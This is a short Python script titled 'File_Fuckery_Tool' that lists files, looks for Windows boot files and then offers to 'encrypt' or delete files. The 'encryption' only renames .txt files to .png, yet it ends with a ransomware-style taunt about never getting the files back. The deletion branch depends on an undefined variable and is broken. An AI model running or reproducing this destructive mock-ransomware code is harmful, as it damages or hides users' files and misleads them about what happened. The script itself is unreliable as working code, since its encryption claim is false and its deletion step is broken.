#File_Fuckery_Tool
import os
print("Finding Windows Files...")

def find_files(start_dir):
    for root, dirs, files in os.walk(start_dir):
        for file in files:
            if file.endswith('.py') or file.endswith('.txt') or file.endswith('.png') or file.endswith('.exe'):
                print(os.path.join(root, file))
start_directory = '.' 
find_files(start_directory)
print("------------------\n.py / .txt Files found.")
def find_windows_boot_file():
    print("Searching for Windows boot file...")
    boot_files = ['bootmgr', 'NTLDR']
    for root, dirs, files in os.walk('C:\\'):
        for boot_file in boot_files:
            if boot_file in files:
                print(f"Found {boot_file} in: {root}")
                return
    print("Windows boot file not found.")

find_windows_boot_file()
choice = input("Encrypt Files? [Y/N]: ")
if choice == "Y":
    print("Encrypting Files...")
    for filename in os.listdir('.'):
        if filename.endswith('.txt'):
            old_file = os.path.join('.', filename)
            new_filename = filename[:-4] + '.png'
            new_file = os.path.join('.', new_filename)
            os.rename(old_file, new_file)
            print("Files have been encrpyted to .png format. :)\n\nGood luck getting all of them back.")
elif choice == "N":
    print("Not encrpyting files...")
    option = input("Delete Files?[Y/N]: ")
    if option == "Y":
        print("Wiping all .py & .txt files from system.")
        for file_path in files_to_process:
            try:
                os.remove(file_path)
                print(f"Deleted: {file_path}")
            except Exception as e:
                print(f"Error deleting {file_path}: {e}")
    elif option == "N":
        print("Not deleting files.")
    pass

